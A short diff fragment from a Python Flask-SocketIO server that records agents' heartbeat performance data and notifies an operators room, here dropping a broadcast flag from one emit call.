+    emit('agent_notification', data, room='operators')
 
 @socketio.on('heartbeat')
 def handle_heartbeat(data):
@@ -8091,7 +8398,7 @@ def handle_heartbeat(data):
         AGENTS_DATA[agent_id]["memory_usage"] = perf.get('memory', 0)
         AGENTS_DATA[agent_id]["network_usage"] = perf.get('network', 0)
     if prev_sid != request.sid:
-        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+        emit('agent_list_update', _agents_payload(), room='operators')
 
     # Acknowledge heartbeat
     emit('heartbeat_ack', {'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'})
